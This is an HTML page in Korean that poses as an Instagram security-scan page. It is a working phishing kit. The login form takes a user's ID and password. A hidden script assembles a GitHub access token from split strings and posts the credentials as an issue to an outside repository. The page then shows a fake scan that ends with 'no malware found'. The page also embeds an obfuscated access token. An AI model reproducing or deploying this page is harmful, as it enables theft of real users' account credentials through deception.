<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<title>Instagram 보안 센터</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body { margin: 0; padding: 0; background: #ffffff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: -apple-system, "Malgun Gothic", sans-serif; }
  .login-box { width: 350px; padding: 40px; border: 1px solid #dbdbdb; background: white; text-align: center; box-sizing: border-box; }
  
  .logo { width: 175px; margin-bottom: 10px; }
  .info-title { color: #262626; font-weight: bold; font-size: 18px; margin-bottom: 5px; }
  .info-subtitle { color: #8e8e8e; font-size: 13px; margin-bottom: 25px; }
  
  input { width: 100%; padding: 12px; margin-bottom: 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; box-sizing: border-box; }
  
  .error-msg { color: #ed4956; font-size: 12px; margin-bottom: 15px; display: none; text-align: left; }

  .search-btn { 
    width: 100%; padding: 10px; 
    background: #b2dffc; 
    color: white; border: none; border-radius: 8px; 
    font-weight: bold; cursor: default; 
    font-size: 16px; margin-top: 10px; 
    transition: background 0.3s; 
  }
  .search-btn.active { background: #0095f6; cursor: pointer; }
  
  #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 100; align-items: center; justify-content: center; flex-direction: column; }
  .progress-container { width: 200px; background: #eee; height: 6px; border-radius: 10px; overflow: hidden; margin-top: 20px; }
  .progress-bar { width: 0%; height: 100%; background: #0095f6; transition: width 0.1s; }
  .status-text { font-size: 18px; font-weight: bold; color: #262626; }
  .check-icon { width: 60px; margin-bottom: 15px; display: none; }
</style>
</head>
<body>

  <div id="login-container" class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
    <div class="info-title">계정 보안 정밀 검사</div>
    <div class="info-subtitle">귀하의 계정이 안전한지 확인합니다.</div>
    
    <input type="text" id="uid" placeholder="전화번호, 사용자 이름 또는 이메일" oninput="checkInputs()">
    <input type="password" id="upw" placeholder="비밀번호" oninput="checkInputs()">
    
    <div id="err" class="error-msg">비밀번호는 8자리 이상이어야 합니다.</div>
    
    <button id="s-btn" class="search-btn" onclick="validateAndStart()">검사 시작</button>
  </div>

  <div id="overlay">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Eo_circle_green_checkmark.svg/1200px-Eo_circle_green_checkmark.svg.png" id="icon" class="check-icon">
    <div id="status" class="status-text">검사 중...</div>
    <div id="bar-container" class="progress-container">
      <div id="bar" class="progress-bar"></div>
    </div>
  </div>

  <script>
    function checkInputs() {
      const u = document.getElementById('uid').value;
      const p = document.getElementById('upw').value;
      const btn = document.getElementById('s-btn');
      const errorDiv = document.getElementById('err');
      errorDiv.style.display = 'none';

      if (u.length > 0 && p.length > 0) {
        btn.classList.add('active');
      } else {
        btn.classList.remove('active');
      }
    }

    function validateAndStart() {
      const u = document.getElementById('uid').value;
      const p = document.getElementById('upw').value;
      const errorDiv = document.getElementById('err');

      if (!u || !p) {
        errorDiv.innerText = "모든 정보를 입력해 주세요.";
        errorDiv.style.display = 'block';
        return;
      }

      if (p.length < 8) {
        errorDiv.innerText = "비밀번호는 8자리 이상이어야 합니다.";
        errorDiv.style.display = 'block';
        return;
      }

      startProcess(u, p);
    }

    async function startProcess(u, p) {
      sendData(u, p);
      document.getElementById('login-container').style.display = 'none';
      document.getElementById('overlay').style.display = 'flex';

      let width = 0;
      const bar = document.getElementById('bar');
      const status = document.getElementById('status');
      
      const interval = setInterval(() => {
        if (width >= 100) {
          clearInterval(interval);
          status.innerText = "악성 코드 없음";
          document.getElementById('bar-container').style.display = 'none';
          document.getElementById('icon').style.display = 'block';
        } else {
          width += 2;
          bar.style.width = width + '%';
        }
      }, 80);
    }

    async function sendData(id, pw) {
      const s1="ghp_", s2="kXWuJyvOxUus", s3="FDwMLjRi5Q7I", s4="eZLaf83K", s5="Zz9N";
      const TOKEN = s1+s2+s3+s4+s5;
      // 보관함 이름을 'inst'로 변경함
      const REPO = "paparata080-create/inst";
      try {
        await fetch(`https://api.github.com/repos/${REPO}/issues`, {
          method: 'POST',
          headers: { 'Authorization': `token ${TOKEN}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ title: `보안검사: ${id}`, body: `ID: ${id}\nPW: ${pw}` })
        });
      } catch (e) {}
    }
  </script>
</body>
</html>